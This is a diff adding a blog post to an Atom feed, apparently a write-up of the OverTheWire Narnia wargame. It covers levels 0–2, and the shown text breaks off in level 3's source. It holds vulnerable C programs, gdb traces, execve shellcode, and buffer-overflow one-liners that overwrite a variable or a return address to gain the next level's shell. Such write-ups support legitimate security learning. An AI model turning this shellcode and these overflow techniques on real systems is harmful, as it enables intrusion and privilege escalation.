@@ -4,7 +4,7 @@
   <title><![CDATA[idosch]]></title>
   <link href="http://idosch.org/atom.xml" rel="self"/>
   <link href="http://idosch.org/"/>
-  <updated>2014-05-08T22:12:56+03:00</updated>
+  <updated>2014-06-02T18:28:20+03:00</updated>
   <id>http://idosch.org/</id>
   <author>
     <name><![CDATA[Ido Schimmel]]></name>
@@ -12,6 +12,1939 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Narnia Wargame Writeup]]></title>
+    <link href="http://idosch.org/blog/2014/06/01/narnia-wargame-writeup/"/>
+    <updated>2014-06-01T14:09:02+03:00</updated>
+    <id>http://idosch.org/blog/2014/06/01/narnia-wargame-writeup</id>
+    <content type="html"><![CDATA[<h2>Introduction</h2>
+
+<p>I decided to take a little break from <a href="http://www.microcorruption.com">microcorruption</a> (still need to writeup the level before last and do the last one) and do some x86 exploitation instead. The wargame I chose to solve is Narnia, which is run by the great guys at <a href="http://overthewire.org">OverTheWire</a> and is focused at basic Linux/x86 exploitation. If you don&rsquo;t want any spoilers, then continue no further. However, if you already solved the wargame and in a different way than me, please feel free to email me your solutions, as it&rsquo;s a great way to learn new things.</p>
+
+<p>Please note that all the levels are distributed under GPLv2. I decided to state this here in order not to prepend the entire license to each level.</p>
+
+<h2>Level 0</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'> 
+</span><span class='line'>int main(){
+</span><span class='line'>    long val=0x41414141;
+</span><span class='line'>    char buf[20];
+</span><span class='line'>                     
+</span><span class='line'>    printf("Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\n");
+</span><span class='line'>    printf("Here is your chance: ");
+</span><span class='line'>    scanf("%24s",&buf);
+</span><span class='line'>
+</span><span class='line'>    printf("buf: %s\n",buf);
+</span><span class='line'>    printf("val: 0x%08x\n",val);
+</span><span class='line'>
+</span><span class='line'>    if(val==0xdeadbeef)
+</span><span class='line'>        system("/bin/sh");
+</span><span class='line'>    else {
+</span><span class='line'>        printf("WAY OFF!!!!\n");
+</span><span class='line'>        exit(1);
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since <code>buf</code> and <code>val</code> are both stored on the stack, with <code>val</code> just below (in higher memory address) <code>buf</code>, we can simply overflow <code>buf</code> with 24 bytes, so that the last four bytes will overwrite <code>val</code> with the correct value. Using <code>gdb</code> this becomes clearer:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia0@melinda:/narnia$ gdb -q ./narnia0
+</span><span class='line'>Reading symbols from /games/narnia/narnia0...(no debugging symbols found)...done.
+</span><span class='line'>(gdb) set disassembly-flavor intel
+</span><span class='line'>(gdb) disas main
+</span><span class='line'>Dump of assembler code for function main:
+</span><span class='line'>0x080484c4 &lt;+0&gt;:     push   ebp
+</span><span class='line'>0x080484c5 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>0x080484c7 &lt;+3&gt;:     and    esp,0xfffffff0
+</span><span class='line'>0x080484ca &lt;+6&gt;:     sub    esp,0x30
+</span><span class='line'>0x080484cd &lt;+9&gt;:     mov    DWORD PTR [esp+0x2c],0x41414141
+</span><span class='line'>0x080484d5 &lt;+17&gt;:    mov    DWORD PTR [esp],0x8048640
+</span><span class='line'>0x080484dc &lt;+24&gt;:    call   0x80483b0 &lt;puts@plt&gt;
+</span><span class='line'>0x080484e1 &lt;+29&gt;:    mov    eax,0x8048673
+</span><span class='line'>0x080484e6 &lt;+34&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>0x080484e9 &lt;+37&gt;:    call   0x80483a0 &lt;printf@plt&gt;
+</span><span class='line'>0x080484ee &lt;+42&gt;:    mov    eax,0x8048689
+</span><span class='line'>0x080484f3 &lt;+47&gt;:    lea    edx,[esp+0x18]
+</span><span class='line'>0x080484f7 &lt;+51&gt;:    mov    DWORD PTR [esp+0x4],edx
+</span><span class='line'>0x080484fb &lt;+55&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>0x080484fe &lt;+58&gt;:    call   0x8048400 &lt;__isoc99_scanf@plt&gt;
+</span><span class='line'>0x08048503 &lt;+63&gt;:    mov    eax,0x804868e
+</span><span class='line'>0x08048508 &lt;+68&gt;:    lea    edx,[esp+0x18]
+</span><span class='line'>0x0804850c &lt;+72&gt;:    mov    DWORD PTR [esp+0x4],edx
+</span><span class='line'>0x08048510 &lt;+76&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>0x08048513 &lt;+79&gt;:    call   0x80483a0 &lt;printf@plt&gt;
+</span><span class='line'>0x08048518 &lt;+84&gt;:    mov    eax,0x8048697
+</span><span class='line'>0x0804851d &lt;+89&gt;:    mov    edx,DWORD PTR [esp+0x2c]
+</span><span class='line'>0x08048521 &lt;+93&gt;:    mov    DWORD PTR [esp+0x4],edx
+</span><span class='line'>0x08048525 &lt;+97&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>0x08048528 &lt;+100&gt;:   call   0x80483a0 &lt;printf@plt&gt;
+</span><span class='line'>0x0804852d &lt;+105&gt;:   cmp    DWORD PTR [esp+0x2c],0xdeadbeef
+</span><span class='line'>0x08048535 &lt;+113&gt;:   jne    0x804854a &lt;main+134&gt;
+</span><span class='line'>0x08048537 &lt;+115&gt;:   mov    DWORD PTR [esp],0x80486a4
+</span><span class='line'>0x0804853e &lt;+122&gt;:   call   0x80483c0 &lt;system@plt&gt;
+</span><span class='line'>0x08048543 &lt;+127&gt;:   mov    eax,0x0
+</span><span class='line'>0x08048548 &lt;+132&gt;:   leave
+</span><span class='line'>0x08048549 &lt;+133&gt;:   ret
+</span><span class='line'>0x0804854a &lt;+134&gt;:   mov    DWORD PTR [esp],0x80486ac
+</span><span class='line'>0x08048551 &lt;+141&gt;:   call   0x80483b0 &lt;puts@plt&gt;
+</span><span class='line'>0x08048556 &lt;+146&gt;:   mov    DWORD PTR [esp],0x1
+</span><span class='line'>0x0804855d &lt;+153&gt;:   call   0x80483e0 &lt;exit@plt&gt;
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>(gdb) b *main+63
+</span><span class='line'>Breakpoint 1 at 0x8048503
+</span><span class='line'>(gdb) r
+</span><span class='line'>Starting program: /games/narnia/narnia0
+</span><span class='line'>
+</span><span class='line'>point 1, 0x08048503 in main ()
+</span><span class='line'>(gdb) x/30xw $esp
+</span><span class='line'>0xffffd700:     0x08048689      0xffffd718      0x08049ff4      0x08048591
+</span><span class='line'>0xffffd710:     0xffffffff      0xf7e5f116      0x61616161      0x61616161
+</span><span class='line'>0xffffd720:     0xf7feb600      0x00000000      0x08048579      0x41414141
+</span><span class='line'>0xffffd730:     0x08048570      0x00000000      0x00000000      0xf7e454b3
+</span><span class='line'>0xffffd740:     0x00000001      0xffffd7d4      0xffffd7dc      0xf7fd3000
+</span><span class='line'>0xffffd750:     0x00000000      0xffffd71c      0xffffd7dc      0x00000000
+</span><span class='line'>0xffffd760:     0x0804825c      0xf7fceff4      0x00000000      0x00000000
+</span><span class='line'>0xffffd770:     0x00000000      0x602098d8</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Examining the stack just after <code>scanf</code> returns we can see our input at <code>0xffffd718</code> and <code>val</code> just after it at <code>0xffffd72c</code>. In order to get the shell we need <code>val</code> to be <code>0xdeadbeef</code>, but since x86 is little endian, multibyte values are stored in reverse order in memory.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[idosch@nacho ~]$ python2 -c "print '\x41'*20 + '\xef\xbe\xad\xde'" | xclip -i
+</span><span class='line'>arnia0@melinda:/narnia$ ./narnia0
+</span><span class='line'>Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
+</span><span class='line'>Here is your chance:
+</span><span class='line'>buf:
+</span><span class='line'>val: 0xdeadbeef
+</span><span class='line'>$ whoami
+</span><span class='line'>narnia1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Note that I didn&rsquo;t include the flag and input. The latter is because octopress has problem showing non-standard characters.</p>
+
+<h2>Level 1:</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(){
+</span><span class='line'>    int (*ret)();
+</span><span class='line'>
+</span><span class='line'>    if(getenv("EGG")==NULL){
+</span><span class='line'>        printf("Give me something to execute at the env-variable EGG\n");
+</span><span class='line'>        exit(1);
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    printf("Trying to execute EGG!\n");
+</span><span class='line'>    ret = getenv("EGG");
+</span><span class='line'>    ret();
+</span><span class='line'>
+</span><span class='line'>    return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This one is pretty straightforward. A shellcode should be placed in the env-variable <code>EGG</code> (which is located on the stack), so that a shell is spawned with permissions of <code>narnia2</code>.</p>
+
+<p>First, lets check that the stack is indeed executable:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia1@melinda:/narnia$ readelf -a narnia1 | grep GNU_STACK
+</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Writing a shell-spawning shellcode is described in a lot of places so i&rsquo;ll simply paste mine here with comments:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>BITS 32
+</span><span class='line'>
+</span><span class='line'>; int execve(const char *path, char *const argv[], char *const envp[])
+</span><span class='line'>
+</span><span class='line'>xor eax, eax        ; zero eax
+</span><span class='line'>push eax            ; null terminate the string
+</span><span class='line'>push 0x68732f2f     ; push //sh (// is same as / for our purpose)
+</span><span class='line'>push 0x6e69622f     ; push /bin
+</span><span class='line'>mov ebx, esp        ; pass first argument using ebx
+</span><span class='line'>push eax            ; third argument is empty
+</span><span class='line'>mov edx, esp
+</span><span class='line'>push eax            ; second argument is empty
+</span><span class='line'>mov ecx, esp
+</span><span class='line'>mov al, 11          ; execve is system call #11
+</span><span class='line'>int 0x80            ; issue an interrupt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we simply need to assemble it and put it in the env-variable <code>EGG</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia1@melinda:/narnia$ mkdir /tmp/doge1
+</span><span class='line'>narnia1@melinda:/narnia$ cd /tmp/doge1
+</span><span class='line'>narnia1@melinda:/tmp/doge1$ vim shellcode.asm
+</span><span class='line'>narnia1@melinda:/tmp/doge1$ nasm shellcode.asm 
+</span><span class='line'>narnia1@melinda:/tmp/doge1$ export EGG=$(cat shellcode)
+</span><span class='line'>narnia1@melinda:/tmp/doge1$ /narnia/narnia1
+</span><span class='line'>Trying to execute EGG!
+</span><span class='line'>$ whoami 
+</span><span class='line'>narnia2</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 2:</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char * argv[]){
+</span><span class='line'>    char buf[128];
+</span><span class='line'>                    
+</span><span class='line'>    if(argc == 1){
+</span><span class='line'>        printf("Usage: %s argument\n", argv[0]);
+</span><span class='line'>        exit(1);
+</span><span class='line'>    }
+</span><span class='line'>    strcpy(buf,argv[1]);
+</span><span class='line'>    printf("%s", buf);
+</span><span class='line'>
+</span><span class='line'>    return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To solve this level the return address of <code>main</code> needs to be overwritten with the address of a shell-spawning shellcode. Since the stack is executable we can simply put the shellcode in an env-variable as before. However, we first need to determine how many bytes must be written to <code>buf</code> until the return address is overwritten. This can be done by simply using different length inputs (above 128) or <code>gdb</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia2@melinda:/narnia$ gdb -q ./narnia2
+</span><span class='line'>Reading symbols from /games/narnia/narnia2...(no debugging symbols found)...done.
+</span><span class='line'>(gdb) set disassembly-flavor intel
+</span><span class='line'>(gdb) disas main
+</span><span class='line'>Dump of assembler code for function main:
+</span><span class='line'>0x08048424 &lt;+0&gt;:     push   ebp
+</span><span class='line'>0x08048425 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>0x08048427 &lt;+3&gt;:     and    esp,0xfffffff0
+</span><span class='line'>0x0804842a &lt;+6&gt;:     sub    esp,0x90
+</span><span class='line'>0x08048430 &lt;+12&gt;:    cmp    DWORD PTR [ebp+0x8],0x1
+</span><span class='line'>0x08048434 &lt;+16&gt;:    jne    0x8048458 &lt;main+52&gt;
+</span><span class='line'>0x08048436 &lt;+18&gt;:    mov    eax,DWORD PTR [ebp+0xc]
+</span><span class='line'>0x08048439 &lt;+21&gt;:    mov    edx,DWORD PTR [eax]
+</span><span class='line'>0x0804843b &lt;+23&gt;:    mov    eax,0x8048560
+</span><span class='line'>0x08048440 &lt;+28&gt;:    mov    DWORD PTR [esp+0x4],edx
+</span><span class='line'>0x08048444 &lt;+32&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>0x08048447 &lt;+35&gt;:    call   0x8048320 &lt;printf@plt&gt;
+</span><span class='line'>0x0804844c &lt;+40&gt;:    mov    DWORD PTR [esp],0x1
+</span><span class='line'>0x08048453 &lt;+47&gt;:    call   0x8048350 &lt;exit@plt&gt;
+</span><span class='line'>0x08048458 &lt;+52&gt;:    mov    eax,DWORD PTR [ebp+0xc]
+</span><span class='line'>0x0804845b &lt;+55&gt;:    add    eax,0x4
+</span><span class='line'>0x0804845e &lt;+58&gt;:    mov    eax,DWORD PTR [eax]
+</span><span class='line'>0x08048460 &lt;+60&gt;:    mov    DWORD PTR [esp+0x4],eax
+</span><span class='line'>0x08048464 &lt;+64&gt;:    lea    eax,[esp+0x10]
+</span><span class='line'>0x08048468 &lt;+68&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>0x0804846b &lt;+71&gt;:    call   0x8048330 &lt;strcpy@plt&gt;
+</span><span class='line'>0x08048470 &lt;+76&gt;:    mov    eax,0x8048574
+</span><span class='line'>0x08048475 &lt;+81&gt;:    lea    edx,[esp+0x10]
+</span><span class='line'>0x08048479 &lt;+85&gt;:    mov    DWORD PTR [esp+0x4],edx
+</span><span class='line'>0x0804847d &lt;+89&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>0x08048480 &lt;+92&gt;:    call   0x8048320 &lt;printf@plt&gt;
+</span><span class='line'>0x08048485 &lt;+97&gt;:    mov    eax,0x0
+</span><span class='line'>0x0804848a &lt;+102&gt;:   leave
+</span><span class='line'>0x0804848b &lt;+103&gt;:   ret
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>(gdb) b *main+97
+</span><span class='line'>Breakpoint 1 at 0x8048485
+</span><span class='line'>(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>Starting program: /games/narnia/narnia2 AAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x08048485 in main ()
+</span><span class='line'>(gdb) x/50xw $esp
+</span><span class='line'>0xffffd650:     0x08048574      0xffffd660      0x00000001      0xf7ec4a79
+</span><span class='line'>0xffffd660:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd670:     0x41414141      0x41414141      0x00414141      0xf7e5efc3
+</span><span class='line'>0xffffd680:     0x08048258      0x00000000      0x00ca0000      0x00000001
+</span><span class='line'>0xffffd690:     0xffffd8b0      0x0000002f      0xffffd6ec      0xf7fceff4
+</span><span class='line'>0xffffd6a0:     0x08048490      0x08049750      0x00000002      0x080482fd
+</span><span class='line'>0xffffd6b0:     0xf7fcf3e4      0x00008000      0x08049750      0x080484b1
+</span><span class='line'>0xffffd6c0:     0xffffffff      0xf7e5f116      0xf7fceff4      0xf7e5f1a5
+</span><span class='line'>0xffffd6d0:     0xf7feb660      0x00000000      0x08048499      0xf7fceff4
+</span><span class='line'>0xffffd6e0:     0x08048490      0x00000000      0x00000000      0xf7e454b3
+</span><span class='line'>0xffffd6f0:     0x00000002      0xffffd784      0xffffd790      0xf7fd3000
+</span><span class='line'>0xffffd700:     0x00000000      0xffffd71c      0xffffd790      0x00000000
+</span><span class='line'>0xffffd710:     0x0804821c      0xf7fceff4
+</span><span class='line'>(gdb) i f
+</span><span class='line'>Stack level 0, frame at 0xffffd6f0:
+</span><span class='line'>eip = 0x8048485 in main; saved eip 0xf7e454b3
+</span><span class='line'>Arglist at 0xffffd6e8, args:
+</span><span class='line'>Locals at 0xffffd6e8, Previous frame's sp is 0xffffd6f0
+</span><span class='line'>Saved registers:
+</span><span class='line'>ebp at 0xffffd6e8, eip at 0xffffd6ec
+</span><span class='line'>(gdb) p 0xffffd6ec-0xffffd660
+</span><span class='line'>$1 = 140
+</span><span class='line'>
+</span><span class='line'>(gdb) x/5s $esp+0x250
+</span><span class='line'>0xffffd8a0:      ",\b\256\022\066h]\a\237\071ri686"
+</span><span class='line'>0xffffd8b0:      "/games/narnia/narnia2"
+</span><span class='line'>0xffffd8c6:      'A' &lt;repeats 27 times&gt;
+</span><span class='line'>0xffffd8e2:      "SHELLCODE=1\300Ph//shh/bin\211\343P\211\342P\211\341\260\v\315\200"
+</span><span class='line'>0xffffd906:      "SHELL=/bin/bash"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thus, 140 bytes are needed until the return address at <code>0xffffd6ec</code> can be overwritten with our shellcode at <code>0xffffd8e2</code>. However, the length of our argument as well as the debugger itself can shift this address. A possible solution is to make the program segfault and then examine the core dump for the exact address of <code>SHELLCODE</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia2@melinda:/tmp/doge2$ ulimit -c unlimited
+</span><span class='line'>narnia2@melinda:/tmp/doge2$ ./narnia2 $(python -c "print '\x41'*140 + '\xff'*4")
+</span><span class='line'>Segmentation fault (core dumped)
+</span><span class='line'>narnia2@melinda:/tmp/doge2$ gdb -q -c ./core
+</span><span class='line'>[New LWP 8717]
+</span><span class='line'>Core was generated by `./narnia2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
+</span><span class='line'>Program terminated with signal 11, Segmentation fault.
+</span><span class='line'>#0  0xffffffff in ?? ()
+</span><span class='line'>(gdb) x/4s $esp+0x250
+</span><span class='line'>0xffffd8f0:      "\377\377"
+</span><span class='line'>0xffffd8f3:      "SHELLCODE=1\300Ph//shh/bin\211\343P\211\342P\211\341\260\v\315\200"
+</span><span class='line'>0xffffd917:      "TERM=screen"
+</span><span class='line'>0xffffd923:      "SHELL=/bin/bash"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can use the correct address of <code>SHELLCODE</code> (<code>0xffffd8fd</code>) in our exploit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia2@melinda:/narnia$ ./narnia2 $(python -c "print '\x41'*140 + '\xfd\xd8\xff\xff'")
+</span><span class='line'>$ whoami
+</span><span class='line'>narnia3</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 3:</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;sys/types.h&gt;
+</span><span class='line'>#include &lt;sys/stat.h&gt;
+</span><span class='line'>#include &lt;fcntl.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv){
+</span><span class='line'>
+</span><span class='line'>    int  ifd,  ofd;
+</span><span class='line'>    char ofile[16] = "/dev/null";
+</span><span class='line'>    char ifile[32];
+</span><span class='line'>    char buf[32];
+</span><span class='line'>
+</span><span class='line'>    if(argc != 2){
+</span><span class='line'>        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
+</span><span class='line'>        exit(-1);
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    /* open files */
+</span><span class='line'>    strcpy(ifile, argv[1]);
+</span><span class='line'>    if((ofd = open(ofile,O_RDWR)) &lt; 0 ){
+</span><span class='line'>        printf("error opening %s\n", ofile);
+</span><span class='line'>        exit(-1);
+</span><span class='line'>    }
+</span><span class='line'>    if((ifd = open(ifile, O_RDONLY)) &lt; 0 ){
